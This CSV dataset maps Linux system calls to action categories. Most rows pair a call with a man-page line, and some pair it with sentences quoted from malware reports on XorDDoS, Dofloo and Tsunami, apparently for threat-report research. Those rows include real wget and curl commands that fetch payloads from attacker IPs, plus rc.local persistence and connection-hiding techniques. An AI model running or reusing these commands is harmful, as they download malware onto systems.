EntityType,ActionType,Source,Syscall,EnVerb,Sentence
FILE,UPDATE,Xorddos.Micro,write(),update,"if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
FILE,UPDATE,Dofloo.Syscall,write(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
FILE,UPDATE,Dofloo.Security,write(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
FILE,UPDATE,Dofloo.Bleep,write(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
FILE,UPDATE,Xorddos.Micro,write(),set,"The malware calls the subroutine daemon(__nochdir, __noclose) to set itself as a background daemon process, which internally calls fork() and setsid()."
FILE,UPDATE,man,writev(),read,read or write data into multiple buffers
FILE,WAIT,man,poll(),wait,wait for some event on a file descriptor
FILE,WAIT,man,ppoll(),wait,wait for some event on a file descriptor
ID,ID_GET,man,getegid(),get,get group identity
ID,ID_GET,man,getegid32(),get,get group identity
ID,ID_GET,man,geteuid(),get,get user identity
ID,ID_GET,man,geteuid32(),get,get user identity
ID,ID_GET,man,getgid(),get,get group identity
ID,ID_GET,man,getgid32(),get,get group identity
ID,ID_GET,man,getgroups(),get,get/set list of supplementary group IDs
ID,ID_GET,man,getgroups32(),get,get/set list of supplementary group IDs
ID,ID_GET,man,getpgid(),set,set/get process group
ID,ID_GET,man,getpgrp(),set,set/get process group
ID,ID_GET,man,getpid(),get,get process identification
ID,ID_GET,man,getppid(),get,get process identification
ID,ID_GET,man,getresgid(),get,"get real, effective, and saved user/group IDs"
ID,ID_GET,man,getresgid32(),get,"get real, effective, and saved user/group IDs"
ID,ID_GET,man,getresuid(),get,"get real, effective, and saved user/group IDs"
ID,ID_GET,man,getresuid32(),get,"get real, effective, and saved user/group IDs"
ID,ID_GET,man,getsid(),get,get session ID
ID,ID_GET,man,gettid(),get,get thread identification
ID,ID_GET,man,getuid(),get,get user identity
ID,ID_GET,man,getuid32(),get,get user identity
ID,ID_SET,man,setfsgid(),set,set group identity used for filesystem checks
ID,ID_SET,man,setfsgid32(),set,set group identity used for filesystem checks
ID,ID_SET,man,setfsuid(),set,set user identity used for filesystem checks
ID,ID_SET,man,setfsuid32(),set,set user identity used for filesystem checks
ID,ID_SET,man,setgid(),set,set group identity
ID,ID_SET,man,setgid32(),set,set group identity
ID,ID_SET,man,setgroups(),set,get/set list of supplementary group IDs
ID,ID_SET,man,setgroups32(),set,get/set list of supplementary group IDs
ID,ID_SET,man,setpgid(),set,set/get process group
ID,ID_SET,man,setregid(),set,set real and/or effective user or group ID
ID,ID_SET,man,setregid32(),set,set real and/or effective user or group ID
ID,ID_SET,man,setresgid(),set,"set real, effective, and saved user or group ID"
ID,ID_SET,man,setresgid32(),set,"set real, effective, and saved user or group ID"
ID,ID_SET,man,setresuid(),set,"set real, effective, and saved user or group ID"
ID,ID_SET,man,setresuid32(),set,"set real, effective, and saved user or group ID"
ID,ID_SET,man,setreuid(),set,set real and/or effective user or group ID
ID,ID_SET,man,setreuid32(),set,set real and/or effective user or group ID
ID,ID_SET,man,setsid(),set,creates a session and sets the process group ID
ID,ID_SET,Xorddos.Micro,setsid(),assign,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
ID,ID_SET,man,setuid(),set,set user identity
ID,ID_SET,man,setuid32(),set,set user identity
INFO,INFO_GET,man,getrlimit(),get,get/set resource limits
INFO,INFO_GET,man,prlimit64(),get,get/set resource limits
INFO,INFO_GET,man,sysinfo(),return,returns information on overall system statistics
INFO,INFO_GET,man,sysinfo(),get,sysinfo() provides a simple way of getting overall system statistics.
INFO,INFO_GET,None,sysinfo(),gather,gather system information
INFO,INFO_GET,None,sysinfo(),look,look for system information
INFO,INFO_GET,None,sysinfo(),find,find linux kernel information
INFO,INFO_GET,man,ugetrlimit(),get,get/set resource limits
INFO,INFO_GET,man,uname(),get,get name and information about current kernel
INFO,INFO_GET,None,uname(),gather,gather system information
INFO,INFO_GET,None,uname(),look,look for system information
INFO,INFO_GET,None,uname(),find,find linux kernel information
NET,NET_CLOSE,man,mq_unlink(),remove,remove a message queue
NET,NET_CLOSE,man,shutdown(),shut,shut down part of a full
NET,NET_CONNECT,man,accept(),accept,accept a connection on a socket
NET,NET_CONNECT,man,accept4(),accept,accept a connection on a socket
NET,NET_CONNECT,man,bind(),bind,bind a name to a socket
NET,NET_CONNECT,man,bind(),assign,bind() assigns the address specified by addr to the socket
NET,NET_CONNECT,Xorddos.Micro,bind(),hook,Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6
NET,NET_CONNECT,man,connect(),initiate,initiate a connection on a socket
NET,NET_CONNECT,man,connect(),connect,The connect() system call connects the socket referred to by the file descripton
NET,NET_CONNECT,man,mq_notify(),register,register for notification when a message is available
NET,NET_CONNECT,man,mq_open(),open,open a message queue
NET,NET_CONNECT,man,pipe(),create,create pipe
NET,NET_CONNECT,man,pipe2(),create,create pipe
NET,NET_CONNECT,man,socket(),create,create an endpoint for communication
NET,NET_CONNECT,Xorddos.Micro,socket(),hook,Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6
NET,NET_CONNECT,man,socketpair(),create,create a pair of connected sockets
NET,NET_OPTION,man,getpeername(),get,get name of connected peer socket
NET,NET_OPTION,man,getsockname(),get,get socket name
NET,NET_OPTION,man,getsockopt(),get,get and set options on sockets
NET,NET_OPTION,man,getsockopt(),manipulate,getsockopt() and setsockopt() manipulate options for the socket
NET,NET_OPTION,man,mq_getsetattr(),get,get/set message queue attributes
NET,NET_OPTION,man,mq_getsetattr(),set,get/set message queue attributes
NET,NET_OPTION,man,setsockopt(),set,get and set options on sockets
NET,NET_OPTION,man,setsockopt(),manipulate,getsockopt() and setsockopt() manipulate options for the socket
NET,NET_TRANSMIT,man,listen(),listen,listen for connections on a socket
NET,NET_TRANSMIT,man,mq_timedreceive(),receive,receive a message from a message queue
NET,NET_TRANSMIT,man,mq_timedsend(),send,send a message to a message queue
NET,NET_TRANSMIT,man,recv(),receive,receive a message from a socket
NET,NET_TRANSMIT,Miria.NJCCIC,recv(),communicate,Miori has resurfaced using a text-based protocol to communicate with its command-and-control (C&C) rather than the customary use of binary-based protocol.
NET,NET_TRANSMIT,Xorddos.Micro,recv(),download,The attacker communicates with a bot to SSH brute force a target device and download XorDdos.
NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),wget,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),curl,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
NET,NET_TRANSMIT,man,recvfrom(),receive,receive a message from a socket
NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend3,recvfrom(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,recvfrom(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,recvmmsg(),receive,receive multiple messages on a socket
NET,NET_TRANSMIT,man,recvmsg(),receive,receive a message from a socket
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,recvmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,send(),send,send a message on a socket
NET,NET_TRANSMIT,None,send(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Xorddos.Trend2,send(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,send(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend4,send(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,send(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,sendmmsg(),send,send multiple messages on a socket
NET,NET_TRANSMIT,man,sendmsg(),send,send a message on a socket
NET,NET_TRANSMIT,None,sendmsg(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend6,sendmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,sendmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,sendto(),send,send a message on a socket
NET,NET_TRANSMIT,None,sendto(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend5,sendto(),wget,wget http://122.51.133.49:10086/VIP –O VIP
